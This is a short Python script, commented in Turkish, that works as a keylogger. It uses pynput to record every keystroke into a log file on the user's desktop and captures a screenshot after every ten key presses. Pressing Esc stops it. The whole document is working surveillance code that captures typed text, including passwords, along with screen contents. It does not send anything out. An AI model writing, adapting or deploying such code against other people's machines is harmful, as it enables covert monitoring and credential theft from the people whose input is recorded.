from pynput.keyboard import Key,Listener
import os
import pyautogui
import time

global keys

dosya=r"C:\Users\yanmi\Desktop\logs\keylogs\log.txt"
count=0
keys = []

def on_press(key):#tuşabasılmaanı
    global count,keys
    count += 1
    print("{0} yazıldı".format(key))
    keys.append(key)
   
    while count>=10:
        count=0
        pyautogui.screenshot(r'C:\Users\yanmi\Desktop\logs\screenshots\image'+str(key)+'.png')
        write_file(keys)
        keys = [] #dosyakaydetmeişleminitamamladıktansonra
        
     
def write_file(keys): #dosyayayazma
    with open(dosya, "a" , encoding="utf-8") as file:
        
       for key in keys:
        
            k= str(key).replace("'", "")  
            if k.find("space") > 0:
               file.write(" ")
            elif k.find("Key") == -1: #-1 görünmez demek
               file.write(k)
            elif k.find("enter") > 0:
                file.write("\n")
def on_release(key):#esctuşunabasıldığındaprogramdursun
    if key == Key.esc:
        print("Dosyaya Kaydedildi")
        return False

with Listener(on_press = on_press, on_release= on_release) as listener:
    listener.join()
    
